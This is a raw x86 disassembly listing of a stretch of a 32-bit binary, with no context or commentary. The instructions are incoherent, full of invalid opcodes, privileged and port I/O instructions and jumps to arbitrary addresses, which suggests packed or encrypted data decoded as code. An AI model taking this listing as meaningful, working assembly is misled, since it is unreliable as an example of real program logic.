  4060ee:	sub    ah,BYTE PTR [ebp+0x40]
  4060f1:	repnz inc ecx
  4060f3:	rol    ch,cl
  4060f5:	xchg   ecx,eax
  4060f6:	int3   
  4060f7:	inc    edi
  4060f8:	inc    ecx
  4060f9:	cli    
  4060fa:	inc    esi
  4060fb:	add    eax,0xeb1b624
  406100:	push   ecx
  406101:	retf   0x5ebb
  406104:	push   ss
  406105:	ficomp WORD PTR [eax]
  406107:	or     di,bp
  40610a:	inc    eax
  40610b:	ss dec esi
  40610d:	std    
  40610e:	sahf   
  40610f:	ins    DWORD PTR es:[edi],dx
  406110:	mov    ecx,0xc0d034ea
  406115:	push   0xffffffbb
  406117:	cmp    eax,0xb2836d0
  40611c:	adc    eax,0x77fa95f
  406121:	pop    ss
  406122:	aam    0x22
  406124:	ret    
  406125:	repnz adc eax,0x21af977e
  40612b:	aam    0x2e
  40612d:	mov    dh,0x14
  40612f:	xor    BYTE PTR [esi-0x14],0x89
  406133:	jg     0x40616a
  406135:	and    al,0xf0
  406137:	jns    0x406185
  406139:	fistp  WORD PTR [esi+0x6f]
  40613c:	gs clc 
  40613e:	jno    0x4061be
  406140:	dec    edx
  406141:	fstp   DWORD PTR [edi+0x7]
  406144:	hlt    
  406145:	pop    edi
  406146:	ret    0xab5d
  406149:	std    
  40614a:	cld    
  40614b:	pop    edi
  40614c:	sar    DWORD PTR [ecx+eiz*4-0x44],cl
  406150:	fucomip st,st(3)
  406152:	jns    0x904fc940
  406158:	jnp    0x406195
  40615a:	outs   dx,BYTE PTR ds:[esi]
  40615b:	xor    eax,0x16ac4caf
  406160:	xchg   esi,eax
  406161:	inc    eax
  406162:	arpl   WORD PTR [esi],ax
  406164:	hlt    
  406165:	rol    DWORD PTR [edx],1
  406167:	push   cs
  406168:	cmp    cl,ah
  40616a:	in     eax,dx
  40616b:	std    
  40616c:	pusha  
  40616d:	inc    esp
  40616e:	xchg   edx,eax
  40616f:	out    dx,al
  406170:	imul   edi,DWORD PTR [esi-0x145b06fb],0x39
  406177:	push   cs
  406178:	mov    DWORD PTR [ecx+0x71fb1096],0x1afa97d8
  406182:	sub    BYTE PTR [edi+ebx*1],0x94
  406186:	cmp    edx,DWORD PTR [esi+ecx*1-0x74]
  40618a:	js     0x4061cd
  40618c:	mov    edx,0x9bf78aff
  406191:	cmp    al,0xfb
  406193:	xchg   esp,eax
  406194:	inc    esi
  406195:	rcl    eax,cl
  406197:	test   BYTE PTR [edx+edx*2-0x38],dl
  40619b:	in     al,0x82
  40619d:	xor    DWORD PTR [eax+edx*2-0xc],0x8a04aa1a
  4061a5:	icebp  
  4061a6:	pushf  
  4061a7:	gs ins DWORD PTR es:[edi],dx
  4061a9:	inc    ebp
  4061aa:	call   0x3c8d:0xe18b02b1
  4061b1:	push   0x5f
  4061b3:	(bad)  
  4061b4:	call   0x9b3d:0x3aad33bd
  4061bb:	and    al,0xe3
  4061bd:	pop    ds
  4061be:	loop   0x406181
  4061c0:	int    0xed
  4061c2:	loop   0x4061d9
  4061c4:	div    BYTE PTR [ecx+0xa]
  4061c7:	jle    0x406213
  4061c9:	inc    eax
  4061ca:	xor    BYTE PTR [edi],cl
  4061cc:	cmp    DWORD PTR [ebp-0x56],0xffffffeb
  4061d0:	xor    BYTE PTR [esi+0x61ffc1cb],cl
  4061d6:	stos   DWORD PTR es:[edi],eax
  4061d7:	mov    bh,0x8d
  4061d9:	cmp    eax,0x4e0b8897
  4061de:	xor    cl,bh
  4061e0:	lods   al,BYTE PTR ds:[esi]
  4061e1:	bound  edi,QWORD PTR [edx-0x4d]
  4061e4:	fmul   QWORD PTR [edx-0x52]
  4061e7:	loop   0x406178
  4061e9:	popa   
  4061ea:	arpl   WORD PTR [edi+ebp*4+0x63],bx
  4061ee:	sub    eax,0x9ddb4c5e
  4061f3:	or     eax,0x67
  4061f6:	rol    BYTE PTR [ecx-0x74],0xf9
  4061fa:	or     bh,BYTE PTR [edx+edx*2]
  4061fd:	es xchg ebp,eax
  4061ff:	imul   esp,DWORD PTR [esp+ecx*4+0x707ae663],0xffffffd8
  406207:	mov    ds:0x39bcf9ab,eax
  40620c:	xor    BYTE PTR [ecx+ebx*2],ah
  40620f:	mov    dl,0x2a
  406211:	rcr    BYTE PTR [ebp+0x62a9ad49],1
  406217:	arpl   WORD PTR [ecx],si
  406219:	jne    0x406284
  40621b:	and    eax,0x1b0ad074
  406220:	icebp  
  406221:	adc    BYTE PTR ds:0xca09b0d2,bh
  406227:	and    ebp,ecx
  406229:	outs   dx,BYTE PTR ds:[esi]
  40622a:	xor    esi,DWORD PTR ds:0xd719168d
  406230:	inc    ebp
  406231:	dec    ebx
  406232:	js     0x406274
  406234:	out    0xfe,eax
  406236:	jmp    0x406279
  406238:	xchg   ecx,eax
  406239:	aas    
  40623a:	ds popa 
  40623c:	ror    BYTE PTR [esi],0xf8
  40623f:	pop    ss
  406240:	pop    es
  406241:	inc    edx
  406242:	fisubr WORD PTR ds:0xc856cb79
  406248:	mov    dh,0x4c
  40624a:	sbb    bh,BYTE PTR [ecx+0x1f]
  40624d:	mov    edi,0x66d22788
  406252:	sbb    ebp,DWORD PTR fs:[edx-0x30]
  406256:	adc    DWORD PTR [ebx+0x32],esi
  406259:	into   
  40625a:	sub    eax,0x72b93631
  40625f:	in     eax,0x60
  406261:	inc    ebx
  406262:	arpl   WORD PTR [esi],bx
  406264:	fsubr  DWORD PTR [edi+0xfa33a27]
  40626a:	pop    ds
  40626b:	add    ebx,DWORD PTR [ebp-0x5e7c133e]
  406271:	in     al,0xab
  406273:	inc    esi
  406274:	(bad)  
  406275:	(bad)  
  406276:	ja     0x40625c
  406278:	in     al,dx
  406279:	xor    esp,edx
  40627b:	pop    ecx
  40627c:	xor    ecx,DWORD PTR [esi-0x2b]
  40627f:	pop    ds
  406280:	dec    edx
  406281:	(bad)  
  406282:	in     al,dx
  406283:	adc    eax,0x407e660b
  406288:	(bad)  
  406289:	jns    0x406213
  40628b:	sub    DWORD PTR [ecx+0x23],ecx
  40628e:	dec    esp
  40628f:	sbb    bh,BYTE PTR [esi-0x60]
  406292:	add    BYTE PTR [esi],al
  406294:	out    dx,al
  406295:	outs   dx,DWORD PTR ds:[esi]
  406296:	mov    WORD PTR [edi],ds
  406298:	es mov bl,cl
  40629b:	mov    bh,0xf6
  40629d:	inc    edx
  40629e:	push   0xd99294ea
  4062a3:	pushf  
  4062a4:	jle    0x4062f8
  4062a6:	xor    al,0x70
  4062a8:	retf   
  4062a9:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  4062ab:	push   0xffffffd4
  4062ad:	(bad)  
  4062af:	add    DWORD PTR [edx+eiz*2-0x2],edx
  4062b3:	(bad)  
  4062b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062b5:	stos   DWORD PTR es:[edi],eax
  4062b6:	repnz adc DWORD PTR [ecx-0x4d],0xffffffdb
  4062bb:	add    BYTE PTR gs:0xf68f2997,cl
  4062c2:	daa    
  4062c3:	inc    ebx
  4062c4:	es aas 
  4062c6:	or     al,0x9f
  4062c8:	jae    0x4062a3
  4062ca:	es pop edi
  4062cc:	xchg   edx,eax
  4062cd:	xor    BYTE PTR [esi-0x19eb91ef],ah
  4062d3:	test   eax,0xceb310bc
  4062d8:	fbld   TBYTE PTR [eax-0x43]
  4062db:	leave  
  4062dc:	hlt    
  4062dd:	nop
  4062de:	mov    ds:0x81f2c4f7,eax
  4062e3:	dec    ebx
  4062e4:	mov    dh,0xc
  4062e6:	js     0x4062fe
  4062e8:	mov    cl,0x78
  4062ea:	dec    eax
  4062eb:	or     edx,DWORD PTR ss:[esi-0x8a31d67]
  4062f2:	add    eax,0xa36037b5
  4062f7:	icebp  
  4062f8:	loope  0x406362
  4062fa:	sbb    ebx,esi
  4062fc:	and    BYTE PTR [ebx+0x77],dl
  4062ff:	push   esi
  406300:	sbb    DWORD PTR [ecx+0x4d],eax
  406303:	mov    fs,WORD PTR [esp+eax*1+0x15]
  406307:	cmp    al,0x37
  406309:	or     BYTE PTR fs:[ebp+0x395dce1e],0x91
  406311:	mov    ds:0xdad2995d,al
  406316:	inc    eax
  406317:	cmp    esp,edx
  406319:	fs xchg esi,eax
  40631b:	(bad)  
  40631d:	sti    
  40631e:	xchg   esi,eax
  40631f:	aas    
  406320:	dec    ebp
  406321:	xchg   esi,eax
  406322:	fidiv  WORD PTR [ebx-0x32]
  406325:	(bad)  
  406326:	jno    0x406357
  406328:	inc    esi
  406329:	mov    dl,0x4f
  40632b:	dec    edx
  40632c:	rol    DWORD PTR ds:0x1a0f45f5,1
  406332:	or     al,0xef
  406334:	ret    
  406335:	jne    0x406373
  406337:	cmp    eax,0x4d69174a
  40633c:	jne    0x4062df
  40633e:	add    DWORD PTR [edx+0x5c],0x4f
  406342:	stos   BYTE PTR es:[edi],al
  406343:	inc    ebx
  406344:	push   cs
  406345:	iret   
  406346:	(bad)  
  406348:	mov    ds:0xbde53f14,eax
  40634d:	sub    al,0x60
  40634f:	push   esp
  406350:	retf   
  406351:	inc    eax
  406352:	bound  ebp,QWORD PTR [esi]
  406354:	nop
  406355:	jmp    0x471093c1
  40635a:	adc    al,0x1f
  40635c:	pusha  
  40635d:	test   al,0x5c
  40635f:	adc    DWORD PTR [esi],0xffffff8c
  406362:	sbb    eax,0xbd84eb1d
  406367:	push   ebp
  406368:	jge    0x4063d3
  40636a:	xchg   esi,eax
  40636b:	pop    esi
  40636c:	data16 icebp 
  40636e:	jl     0x406309
  406370:	mov    esi,0x9337e758
  406375:	je     0x4063e1
  406377:	leave  
  406378:	inc    eax
  406379:	fnstenv [ebx-0x3f11da17]
  40637f:	jne    0x406370
  406381:	ins    BYTE PTR es:[edi],dx
  406382:	das    
  406383:	sbb    DWORD PTR [ecx],0x2f893cd2
  406389:	xchg   DWORD PTR [ebp+0x34edbd0],eax
  40638f:	and    edx,DWORD PTR [edx]
  406391:	fld    DWORD PTR [eax+0x56]
  406394:	jp     0x40631a
  406396:	dec    eax
  406397:	addr16 iret 
  406399:	jmp    0x4063d7
  40639b:	jmp    DWORD PTR [ebx]
  40639d:	sbb    DWORD PTR [esi+0x1b21ed4],esi
  4063a3:	fsub   st,st(2)
  4063a5:	retf   
  4063a6:	test   eax,0x259c9837
  4063ab:	popa   
  4063ac:	add    esp,edi
  4063ae:	(bad)  
  4063af:	push   es
  4063b0:	cmc    
  4063b1:	lahf   
  4063b2:	in     eax,0x50
  4063b4:	dec    esp
  4063b5:	ins    BYTE PTR es:[edi],dx
  4063b6:	pop    edx
  4063b7:	add    edi,DWORD PTR [ebx+0x48fc5af0]
  4063bd:	mov    eax,0xfb6760bc
  4063c2:	pop    ebx
  4063c3:	div    DWORD PTR ds:0x144ab321
  4063c9:	les    ebp,FWORD PTR [esi-0x7c]
  4063cc:	call   0x80e9f18
  4063d1:	addps  xmm3,XMMWORD PTR [ebx-0x2e]
  4063d5:	shl    BYTE PTR [eax+0x193142b8],cl
  4063db:	add    BYTE PTR [ebp+0x59],0x30
  4063df:	cmp    BYTE PTR [edi+0x1790cb9f],0x78
  4063e6:	int3   
  4063e7:	icebp  
  4063e8:	test   DWORD PTR ds:0x5adff574,0xc5c21a54
  4063f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4063f3:	xor    DWORD PTR [edi],ecx
  4063f5:	inc    ebp
  4063f6:	and    eax,0x42797e39
  4063fb:	cwde   
  4063fc:	xor    ecx,DWORD PTR [ecx-0x63]
  4063ff:	xor    al,0xc4
  406401:	(bad)  
  406402:	cmp    bl,bh
  406404:	inc    edx
  406405:	stc    
  406406:	xor    BYTE PTR [esi+edx*1-0x1f],dl
  40640a:	jno    0x4063c5
  40640c:	jnp    0x40648d
  40640e:	lods   eax,DWORD PTR ds:[esi]
  40640f:	xchg   ecx,edi
  406411:	clc    
  406412:	mov    esp,0x916a7621
  406417:	mov    eax,0xd3067b07
  40641c:	test   edi,ebx
  40641e:	mov    WORD PTR [ebx+eiz*1-0x3a],gs
  406422:	int3   
  406423:	outs   dx,BYTE PTR ds:[esi]
  406424:	mov    DWORD PTR [esi],esi
  406426:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406427:	mov    dl,0x4
  406429:	mov    cl,0xdf
  40642b:	add    eax,0xe748664a
  406431:	ret    
  406432:	ret    
  406433:	pop    ecx
  406434:	leave  
  406435:	cwde   
  406436:	mov    bh,0xfe
  406438:	mov    esi,0xa726f814
  40643d:	cld    
  40643e:	mov    esi,DWORD PTR cs:[ebp-0x14]
  406442:	sbb    edx,edx
  406444:	dec    ebp
  406445:	pop    ebx
  406446:	push   eax
  406447:	push   cs
  406448:	xchg   edi,eax
  406449:	loopne 0x4064c9
  40644b:	or     BYTE PTR [edi+0x2b],ah
  40644e:	jmp    0x6e6f0969
  406453:	cmp    eax,0x41949b26
  406458:	mov    gs,WORD PTR [ebx-0x6f8179c7]
  40645e:	xlat   BYTE PTR ds:[ebx]
  40645f:	stos   BYTE PTR es:[edi],al
  406460:	cmp    BYTE PTR [ebp+0x6c515cf4],al
  406466:	stos   BYTE PTR es:[edi],al
  406467:	ins    BYTE PTR es:[edi],dx
  406468:	inc    esi
  406469:	es cdq 
  40646b:	mov    dh,0x16
  40646d:	fstp   QWORD PTR [edi]
  40646f:	dec    edi
  406470:	cli    
  406471:	fwait
  406472:	xchg   esi,eax
  406473:	add    eax,0xfa015ef6
  406478:	push   ebp
  406479:	adc    al,0xb2
  40647b:	and    ecx,DWORD PTR [ecx+0x61f4b383]
  406481:	mov    BYTE PTR [ebp-0x63476a38],dl
  406487:	jge    0x406492
  406489:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40648a:	shl    dh,1
  40648c:	cmp    al,0xed
  40648e:	push   0x278c20
  406493:	jmp    0xfdf8:0x73481655
  40649a:	scas   al,BYTE PTR es:[edi]
  40649b:	mov    al,0xf7
  40649d:	lock data16 mov BYTE PTR es:[edi+edx*8+0x58bec7ab],dh
  4064a7:	xchg   ecx,edi
  4064a9:	dec    edx
  4064aa:	push   0x3f9cc3c8
  4064af:	xor    al,0x94
  4064b1:	fistp  WORD PTR [edx]
  4064b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4064b4:	daa    
  4064b5:	(bad)  
  4064b6:	xchg   edx,eax
  4064b7:	adc    BYTE PTR [edx-0x4],ah
  4064ba:	jle    0x406508
  4064bc:	es push 0x8bc53869
  4064c2:	cmc    
  4064c3:	bnd jo 0x406537
  4064c6:	fxam   
  4064c8:	mov    edi,0x5a26a19a
  4064cd:	push   esi
  4064ce:	and    dh,BYTE PTR [edx]
  4064d0:	int3   
  4064d1:	fbld   TBYTE PTR [eax+edi*1+0x33]
  4064d5:	ret    0xff3a
  4064d8:	rol    DWORD PTR [ebx],cl
  4064da:	add    ebx,DWORD PTR [edi+ebx*2-0xa87b412]
  4064e1:	adc    dh,ch
  4064e3:	mov    esp,0xb2b8e8fe
  4064e8:	dec    ebp
  4064e9:	jne    0x4064e6
  4064eb:	into   
  4064ec:	out    0xcd,eax
  4064ee:	jbe    0x406476
  4064f0:	push   ebp
  4064f1:	cmc    
  4064f2:	inc    eax
  4064f3:	ins    DWORD PTR es:[edi],dx
  4064f4:	mov    cl,0x3b
  4064f6:	sbb    BYTE PTR [ebx],bh
  4064f8:	int    0x10
  4064fa:	lahf   
  4064fb:	push   0x3079f06a
  406500:	or     al,0xcd
  406502:	xor    ecx,eax
  406504:	mov    bh,0xde
  406506:	sub    ebp,DWORD PTR [ebx+edx*1]
  406509:	pop    ebp
  40650a:	iret   
  40650b:	shl    BYTE PTR [ebx],cl
  40650d:	mov    ds:0x91220e62,al
  406512:	xor    esp,DWORD PTR [ebp+0x61]
  406515:	pop    ecx
  406516:	and    cl,BYTE PTR [eax+0x6]
  406519:	fbstp  TBYTE PTR [ecx-0x533a8970]
  40651f:	sub    bh,ah
  406521:	sbb    DWORD PTR [ecx+0x2f87c997],ecx
  406527:	dec    esp
  406528:	cmp    eax,0x872cad77
  40652d:	fild   WORD PTR [ebx-0x7533b4ed]
  406533:	dec    ebp
  406534:	jg     0x406532
  406536:	mov    ch,0x74
  406538:	iret   
  406539:	hlt    
  40653a:	and    eax,0x57f565eb
  40653f:	js     0x40659c
  406541:	ja     0x406538
  406543:	xor    ecx,DWORD PTR [eax]
  406545:	adc    al,0x49
  406547:	cmp    BYTE PTR [esi-0xb794746],dh
  40654d:	lahf   
  40654e:	out    dx,eax
  40654f:	pop    ds
  406550:	mov    esp,0x223f6ab2
  406555:	inc    esp
  406556:	jns    0x4065cf
  406558:	cmp    DWORD PTR [bp+si+0x76],ebp
  40655c:	xchg   esi,eax
  40655d:	mov    ecx,0x70fceee0
  406562:	mov    es,eax
  406564:	add    eax,0x9a65f39d
  406569:	jne    0x40653e
  40656b:	rcl    DWORD PTR [edx],cl
  40656d:	inc    edi
  40656e:	or     eax,0x80f34f2c
  406573:	fwait
  406574:	bound  ebp,QWORD PTR ds:0x473ab3a0
  40657a:	mov    dl,0xae
  40657c:	fisttp DWORD PTR [ebp-0x670b7d97]
  406582:	rol    ecx,0xd4
  406585:	or     ah,BYTE PTR ds:0xdcabd075
  40658b:	jo     0x4065f0
  40658d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40658e:	adc    DWORD PTR [ebp-0x76],edx
  406591:	arpl   WORD PTR [ebx-0x33],si
  406594:	pop    ebp
  406595:	rol    BYTE PTR [edx+0x711b81e9],0x66
  40659c:	sti    
  40659d:	mov    eax,ds:0x1798b78d
  4065a2:	js     0x406594
  4065a4:	mov    ah,0x28
  4065a6:	mov    cs,edi
  4065a8:	adc    bl,0xbf
  4065ab:	lahf   
  4065ac:	fstp   DWORD PTR [edi+0x79]
  4065af:	mov    ebx,0xe732cfc7
  4065b4:	pop    ebp
  4065b5:	inc    ebp
  4065b6:	push   ebp
  4065b7:	fst    st(1)
  4065b9:	and    al,0x92
  4065bb:	inc    ecx
  4065bc:	sub    eax,0x600e1a74
  4065c1:	inc    ecx
  4065c2:	cmc    
  4065c3:	dec    edx
  4065c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065c5:	cwde   
  4065c6:	into   
  4065c7:	(bad)  
  4065c8:	xchg   esi,eax
  4065c9:	cmp    cl,bl
  4065cb:	inc    ebp
  4065cc:	dec    ebp
  4065cd:	sub    BYTE PTR [esp+ecx*8+0xd],cl
  4065d1:	xchg   ecx,eax
  4065d2:	int3   
  4065d3:	(bad)
  4065d7:	and    esp,DWORD PTR [edi-0x3d83a64c]
  4065dd:	xchg   esi,eax
  4065de:	xchg   esi,eax
  4065df:	test   eax,0xa059ed06
  4065e4:	jo     0x406566
  4065e6:	mov    WORD PTR [esi],cs
  4065e8:	or     esi,ebp
  4065ea:	jge    0x4065af
  4065ec:	cmc    
  4065ed:	shr    DWORD PTR [edx-0x7548f3cf],0x2b
  4065f4:	mov    eax,ds:0xeb3c0fd9
  4065f9:	mov    ah,0xf6
  4065fb:	in     eax,dx
  4065fc:	in     al,0x0
  4065fe:	adc    al,0x82
  406600:	inc    ebp
  406601:	ja     0x40662d
  406603:	out    0xc2,eax
  406605:	in     eax,0xf0
  406607:	add    eax,0x76a2840c
  40660c:	push   esp
  40660d:	mov    bl,0x5d
  40660f:	sub    BYTE PTR [eax-0x80],0x93
  406613:	(bad)  
  406614:	jae    0x40661a
  406616:	in     eax,dx
  406617:	xor    ebx,0xadfb1178
  40661d:	(bad)  
  40661f:	xor    eax,0xf63ee45a
  406624:	push   ds
  406625:	int3   
  406626:	mov    edx,0xc6ab3a0e
  40662b:	dec    esp
  40662c:	mul    BYTE PTR [ebx-0x3ec4bb10]
  406632:	fcmovnbe st,st(4)
  406634:	and    dh,dl
  406636:	daa    
  406637:	int3   
  406638:	mov    al,BYTE PTR [edi-0x6a7fde82]
  40663e:	jno    0x406612
  406640:	outs   dx,BYTE PTR ds:[si]
  406642:	cwde   
  406643:	push   0xffffff8a
  406645:	cmc    
  406646:	les    edi,FWORD PTR [edi]
  406648:	jmp    0x40660c
  40664a:	and    ch,BYTE PTR [ebx+eax*1-0x68420549]
  406651:	loopne 0x406661
  406653:	cmp    dh,BYTE PTR [ecx+0x4211ccb7]
  406659:	in     eax,0x2b
  40665b:	daa    
  40665c:	lea    eax,[esi-0x5a]
  40665f:	rcl    DWORD PTR ds:0x18d1bb56,1
  406665:	dec    esp
  406666:	jne    0x40666f
  406668:	out    0x7f,al
  40666a:	sbb    DWORD PTR [eax],ebx
  40666c:	or     esp,ebp
  40666e:	cs test eax,0x77e8ae83
  406674:	clc    
  406675:	leave  
  406676:	mov    ds:0xcdbb012,eax
  40667b:	(bad)  
  40667c:	pop    ebx
  40667d:	sbb    al,0x7d
  40667f:	nop
  406680:	push   eax
  406681:	cmp    al,0xb2
  406683:	jo     0x406662
  406685:	xlat   BYTE PTR ds:[ebx]
  406686:	xor    BYTE PTR [ecx+0x1973a3ee],bh
  40668c:	mov    eax,0xa1f12a8a
  406691:	adc    al,0x7b
  406693:	pop    ss
  406694:	ret    
  406695:	aad    0xbf
  406697:	popf   
  406698:	push   0xe4f560e2
  40669d:	(bad)  
  40669e:	mov    ebp,0x6b2f4040
  4066a3:	ins    BYTE PTR es:[edi],dx
  4066a4:	cmc    
  4066a5:	and    DWORD PTR [eax+0x7d],0x26474622
  4066ac:	sub    eax,0xe12608ff
  4066b1:	push   cs
  4066b2:	push   esp
  4066b3:	rcr    ah,0xdd
  4066b6:	sbb    DWORD PTR [ebp-0x24088f5a],0x78
  4066bd:	adc    edx,eax
  4066bf:	lods   al,BYTE PTR ds:[esi]
  4066c0:	mov    ds:0x8b524941,al
  4066c5:	(bad)  
  4066c7:	and    ch,BYTE PTR [edx-0x5b]
  4066ca:	xor    bh,BYTE PTR [edi]
  4066cc:	and    eax,0xa7eec06b
  4066d1:	mov    eax,ds:0x3da78e06
  4066d6:	inc    esi
  4066d7:	xchg   esp,eax
  4066d8:	daa    
  4066d9:	stos   BYTE PTR es:[edi],al
  4066da:	mov    ah,0x72
  4066dc:	paddb  mm2,QWORD PTR [ecx]
  4066df:	jg     0x4066f2
  4066e1:	cld    
  4066e2:	pop    es
  4066e3:	sahf   
  4066e4:	(bad)  
  4066e6:	hlt    
  4066e7:	pop    eax
  4066e8:	mov    ds:0x67c8a181,eax
  4066ed:	push   0xffffff80
  4066ef:	int    0x38
  4066f1:	fidivr WORD PTR [ecx-0x3c]
  4066f4:	(bad)  [edx+eax*4]
  4066f7:	ins    BYTE PTR es:[edi],dx
  4066f8:	mov    BYTE PTR [edx+0x487febb7],cl
  4066fe:	ins    BYTE PTR es:[edi],dx
  4066ff:	cmp    cl,bh
  406701:	jge    0x40672d
  406703:	jg     0x40668e
  406705:	pop    ds
  406706:	test   DWORD PTR [ecx+0x4b282f37],0x189391e1
  406710:	mov    WORD PTR [ebx],cs
  406712:	mov    esp,0xea8d9dd0
  406717:	adc    DWORD PTR [ecx-0x10272466],0x1f
  40671e:	dec    eax
  40671f:	popf   
  406720:	call   0x8540:0x4a0580c2
  406727:	mov    ah,0xc0
  406729:	in     al,0xf9
  40672b:	imul   ecx,DWORD PTR [edi-0x54],0xffffff9c
  40672f:	icebp  
  406730:	mov    eax,0x30f32e77
  406735:	ret    
  406736:	int3   
  406737:	mov    dl,0xc6
  406739:	shr    esi,cl
  40673b:	clc    
  40673c:	call   0xe5f24022
  406741:	add    edi,DWORD PTR [eax+0x64]
  406744:	cmp    edx,DWORD PTR [ebp-0x20]
  406747:	push   ebp
  406748:	xlat   BYTE PTR ds:[ebx]
  406749:	dec    edi
  40674a:	adc    BYTE PTR [eax+0x8ce4a34],0x2
  406751:	ret    0x86f5
  406754:	lods   al,BYTE PTR ds:[esi]
  406755:	dec    esi
  406756:	ins    DWORD PTR es:[edi],dx
  406757:	cld    
  406758:	jae    0x406746
  40675a:	cmp    al,bh
  40675c:	or     al,0x13
  40675e:	nop
  40675f:	in     al,0x62
  406761:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406762:	sbb    eax,0x392cab4
  406767:	sti    
  406768:	xchg   esp,eax
  406769:	mov    ebp,0xbfe99f5b
  40676e:	adc    BYTE PTR [edi+esi*8+0x3b],al
  406772:	mov    ?,WORD PTR [ecx]
  406774:	xchg   esi,eax
  406775:	sbb    eax,0xed5bb69b
  40677a:	ins    DWORD PTR es:[edi],dx
  40677b:	call   0xfd9116ea
  406780:	push   edi
  406781:	adc    eax,0x2bf01017
  406786:	js     0x406754
  406788:	cmp    cl,BYTE PTR [esi+0x2e]
  40678b:	repz push cs
  40678d:	mov    WORD PTR [esi],?
  40678f:	mov    BYTE PTR [ecx+0x478a65f8],0x19
  406796:	mov    edi,0xd7e9667b
  40679b:	jp     0x406763
  40679d:	cld    
  40679e:	call   0x51553e00
  4067a3:	mov    ?,ecx
  4067a5:	jae    0x4067d7
  4067a7:	xchg   BYTE PTR [ecx-0x34],bh
  4067aa:	xchg   esp,eax
  4067ab:	test   ebx,0xac8a8d28
  4067b1:	push   cs
  4067b2:	es xchg esp,eax
  4067b4:	jne    0x4067bf
  4067b6:	ins    BYTE PTR es:[edi],dx
  4067b7:	pop    ecx
  4067b8:	scas   eax,DWORD PTR es:[edi]
  4067b9:	ins    DWORD PTR es:[edi],dx
  4067ba:	(bad)  
  4067bb:	aam    0x46
  4067bd:	daa    
  4067be:	xchg   edi,edi
  4067c0:	inc    eax
  4067c1:	jns    0x4067ce
  4067c3:	daa    
  4067c4:	cld    
  4067c5:	mov    al,fs:0x82305c15
  4067cb:	sar    BYTE PTR [eax+0x2e],0xc8
  4067cf:	sub    BYTE PTR [edi+0x6d],al
  4067d2:	xchg   edi,eax
  4067d3:	dec    eax
  4067d4:	pop    ebp
  4067d5:	add    al,0x2f
  4067d7:	sub    BYTE PTR [ecx],ah
  4067d9:	mov    ds:0x1d593ce8,al
  4067de:	ret    
  4067df:	add    BYTE PTR [edi],dl
  4067e1:	retf   
  4067e2:	test   eax,0x92d128a1
  4067e7:	int    0xb9
  4067e9:	sbb    cl,BYTE PTR [eax+ebp*1-0x1300a551]
  4067f0:	mov    ecx,0x3dd222dd
  4067f5:	in     eax,dx
  4067f6:	out    dx,eax
  4067f7:	leave  
  4067f8:	cmp    al,0xb7
  4067fa:	das    
  4067fb:	mov    al,0x21
  4067fd:	nop
  4067fe:	jnp    0x406809
  406800:	inc    eax
  406801:	and    al,0xb4
  406803:	in     al,dx
  406804:	mov    ebp,cr4
  406807:	rcr    DWORD PTR [ecx+0x1edf71f],1
  40680d:	dec    eax
  40680e:	add    dl,BYTE PTR [edi]
  406810:	mov    cl,dh
  406812:	add    esi,edx
  406814:	inc    ebp
  406815:	bound  ebx,QWORD PTR [ebp-0x67]
  406818:	jne    0x406841
  40681a:	ret    0x8790
  40681d:	jg     0x406849
  40681f:	out    0xfa,eax
  406821:	or     eax,0x30ec4dc3
  406826:	mov    dl,0xb
  406828:	or     eax,0xc6ea924
  40682d:	xchg   ecx,eax
  40682e:	sub    BYTE PTR [ecx+edi*2-0x394fd9a9],dl
  406835:	pop    ds
  406836:	scas   al,BYTE PTR es:[edi]
  406837:	bound  ebp,QWORD PTR [edi+0x7c6fde17]
  40683d:	enter  0xfee8,0xd8
  406841:	mov    ch,0xa9
  406843:	jg     0x406891
  406845:	sbb    esi,DWORD PTR [edi-0x7c9db6b3]
  40684b:	mov    dh,ch
  40684d:	sti    
  40684e:	stc    
  40684f:	xor    bh,BYTE PTR [edx+0x5b353179]
  406855:	sbb    DWORD PTR [eax],esp
  406857:	cli    
  406858:	cld    
  406859:	rcr    BYTE PTR [edi-0xcd98c0e],0x20
  406860:	xor    BYTE PTR [ebp-0x6c],bl
  406863:	sub    eax,0xc4e6289d
  406868:	and    esp,edi
  40686a:	pushf  
  40686b:	cmp    bl,BYTE PTR [edi-0x55]
  40686e:	mov    esi,0x18dce2fa
  406873:	shufps xmm5,XMMWORD PTR [ecx-0x63],0x1c
  406878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406879:	mov    dl,0x45
  40687b:	jo     0x40682b
  40687d:	xor    eax,0x523b47a7
  406882:	fistp  QWORD PTR [eax]
  406884:	lea    ecx,ds:[edi+esi*4+0x62]
  406889:	fstp   QWORD PTR [edx+edx*2]
  40688c:	mov    WORD PTR [edi-0x458caa9f],cs
  406892:	bts    DWORD PTR [ebx+0x7feec81e],edi
  406899:	popf   
  40689a:	aaa    
  40689b:	les    ebp,FWORD PTR [edx+0x13]
  40689e:	sbb    BYTE PTR [ecx],dl
  4068a0:	xchg   esp,eax
  4068a1:	rol    DWORD PTR ss:[ecx+0x2ab9fa9c],0x4a
  4068a9:	inc    DWORD PTR [edx+edx*1-0xe647a4c]
  4068b0:	int    0x3e
  4068b2:	sub    eax,0xe5319780
  4068b7:	shl    BYTE PTR [ebp-0x4dbbe252],cl
  4068bd:	loop   0x40685f
  4068bf:	mov    ecx,0x3cfdd0ab
  4068c4:	adc    al,0x7e
  4068c6:	std    
  4068c7:	aas    
  4068c8:	sbb    esp,DWORD PTR [ebx-0x499eec17]
  4068ce:	sar    BYTE PTR [edx],0xed
  4068d1:	cld    
  4068d2:	add    esi,DWORD PTR [edx-0x541fa748]
  4068d8:	jmp    0x61c7ebae
  4068dd:	cmc    
  4068de:	cdq    
  4068df:	push   ebx
  4068e0:	xchg   edx,eax
  4068e1:	adc    ecx,ebx
  4068e3:	in     eax,dx
  4068e4:	pop    eax
  4068e5:	xchg   ebp,eax
  4068e7:	rcl    edi,0x8b
  4068ea:	cmp    DWORD PTR [eax+edx*8-0x4bee943c],ebx
  4068f1:	addr16 adc esi,esp
  4068f4:	or     cl,BYTE PTR [ecx+0x53]
